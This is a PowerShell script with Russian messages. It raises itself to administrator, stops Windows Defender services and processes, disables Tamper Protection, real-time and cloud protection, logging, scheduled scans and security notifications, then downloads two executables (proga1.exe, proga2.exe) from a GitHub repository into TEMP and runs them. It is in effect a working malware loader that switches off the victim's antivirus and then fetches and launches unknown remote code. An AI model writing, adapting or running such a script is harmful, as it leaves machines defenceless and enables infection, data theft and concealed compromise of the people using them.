Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Повышение прав не сработало :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER ===" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

# Останавливаем службы Defender
Write-Host "`n[1/6] Остановка служб Windows Defender..." -ForegroundColor Cyan
$services = @(
    "WinDefend",
    "WdNisSvc", 
    "MDCoreSvc",
    "SecurityHealthService",
    "Sense",
    "WdBoot",
    "WdFilter",
    "WdNisDrv"
)

foreach ($svc in $services) {
    try {
        Stop-Service $svc -Force -ErrorAction SilentlyContinue
        Write-Host "  Остановлена служба: $svc" -ForegroundColor Gray
    } catch {
        # Игнорируем ошибки, если служба не существует или уже остановлена
    }
}

# Отключаем Tamper Protection (нужно для отключения Defender)
Write-Host "`n[2/6] Отключение Tamper Protection..." -ForegroundColor Cyan
try {
    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>$null
    Write-Host "  Tamper Protection ОТКЛЮЧЕН" -ForegroundColor Green
} catch {
    Write-Host "  Не удалось отключить Tamper Protection" -ForegroundColor Yellow
}

# Основные настройки Defender
Write-Host "`n[3/6] Настройка политик Windows Defender..." -ForegroundColor Cyan

# Удаляем старые политики
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>$null

# Создаем ключи
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>$null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /f 2>$null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>$null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /f 2>$null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /f 2>$null

# Основные отключающие параметры
$defenderSettings = @(
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="AllowFastServiceStartup"; Value=0; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableAntiVirus"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableLocalAdminMerge"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableSpecialRunningModes"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="ServiceKeepAlive"; Value=0; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"; Name="MpEnablePus"; Value=0; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableBehaviorMonitoring"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIntrusionPreventionSystem"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIOAVProtection"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableOnAccessProtection"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRawWriteNotification"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRoutinelyTakingAction"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableScanOnRealtimeEnable"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"; Name="DisableEnhancedNotifications"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="DisableBlockAtFirstSeen"; Value=1; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="SpynetReporting"; Value=0; Type="REG_DWORD"},
    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="SubmitSamplesConsent"; Value=2; Type="REG_DWORD"}
)

foreach ($setting in $defenderSettings) {
    try {
        reg add $setting.Path /v $setting.Name /t $setting.Type /d $setting.Value /f 2>$null
        Write-Host "  Установлено: $($setting.Name) = $($setting.Value)" -ForegroundColor Gray
    } catch {
        Write-Host "  Ошибка: $($setting.Name)" -ForegroundColor DarkYellow
    }
}

# Отключение логирования
Write-Host "`n[4/6] Отключение логирования Defender..." -ForegroundColor Cyan
try {
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f 2>$null
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f 2>$null
    Write-Host "  Логирование ОТКЛЮЧЕНО" -ForegroundColor Green
} catch {
    Write-Host "  Ошибка отключения логирования" -ForegroundColor Yellow
}

# Отключение задач планировщика
Write-Host "`n[5/6] Отключение задач планировщика Defender..." -ForegroundColor Cyan
$tasks = @(
    "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh",
    "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "Microsoft\Windows\Windows Defender\Windows Defender Verification"
)

foreach ($task in $tasks) {
    try {
        schtasks /Change /TN "$task" /Disable 2>$null
        Write-Host "  Отключена задача: $task" -ForegroundColor Gray
    } catch {
        # Задача может не существовать
    }
}

# Удаление контекстного меню Defender
Write-Host "`n[6/6] Удаление контекстного меню Defender..." -ForegroundColor Cyan
try {
    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f 2>$null
    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f 2>$null
    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f 2>$null
    Write-Host "  Контекстное меню УДАЛЕНО" -ForegroundColor Green
} catch {
    Write-Host "  Ошибка удаления контекстного меню" -ForegroundColor Yellow
}

# Отключение служб (финальное)
Write-Host "`n[Дополнительно] Финальное отключение служб..." -ForegroundColor Cyan
$serviceConfigs = @(
    @{Name="MDCoreSvc"; Start=4},
    @{Name="WdFilter"; Start=4},
    @{Name="WdNisDrv"; Start=4},
    @{Name="WdNisSvc"; Start=4},
    @{Name="WinDefend"; Start=4}
)

foreach ($svc in $serviceConfigs) {
    try {
        reg add "HKLM\System\CurrentControlSet\Services\$($svc.Name)" /v "Start" /t REG_DWORD /d $svc.Start /f 2>$null
        Write-Host "  Отключена служба: $($svc.Name)" -ForegroundColor Gray
    } catch {
        # Игнорируем
    }
}

# Отключение уведомлений
Write-Host "`n[Опционально] Отключение уведомлений..." -ForegroundColor Cyan
try {
    reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f 2>$null
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f 2>$null
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f 2>$null
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f 2>$null
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f 2>$null
    Write-Host "  Уведомления ОТКЛЮЧЕНЫ" -ForegroundColor Green
} catch {
    Write-Host "  Ошибка отключения уведомлений" -ForegroundColor Yellow
}

# Принудительная остановка всех процессов Defender
Write-Host "`n[Финал] Принудительная остановка процессов..." -ForegroundColor Cyan
$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense")
foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-Host "  Остановлен процесс: $proc" -ForegroundColor Gray
    } catch {
        # Процесс не запущен
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "=== WINDOWS DEFENDER ПОЛНОСТЬЮ ОТКЛЮЧЕН ===" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "ВНИМАНИЕ: Для полного применения может потребоваться ПЕРЕЗАГРУЗКА!" -ForegroundColor Yellow
Write-Host ""
Write-Host "=== Скачивание и запуск файлов ===" -ForegroundColor Yellow

# Дальше идет ваш код скачивания файлов...
$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        try {
            [System.GC]::Collect()
            Start-Sleep -Milliseconds 500
            Remove-Item $dest -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    
    try {
        Write-Host "Скачивание с: $url" -ForegroundColor Gray
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile($url, $dest)
        $webClient.Dispose()
        return $true
    } catch {
        Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
        return $false
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "`n[1/2] Скачивание proga1.exe..." -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "УСПЕХ: proga1.exe скачан" -ForegroundColor Green
        $downloaded++
    }
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "`n[2/2] Скачивание proga2.exe..." -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "УСПЕХ: proga2.exe скачан" -ForegroundColor Green
        $downloaded++
    }
} else {
    Write-Host "ПРЕДУПРЕЖДЕНИЕ: proga2.exe не найден, создаем копию" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        $downloaded++
    }
}

Write-Host "`n=== Запуск файлов ===" -ForegroundColor Yellow
if (Test-Path $dest1) { Start-Process $dest1 }
if (Test-Path $dest2) { Start-Sleep 1; Start-Process $dest2 }

Write-Host "`n=== ГОТОВО ($downloaded/2) ===" -ForegroundColor Green
Write-Host "Нажмите любую клавишу..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
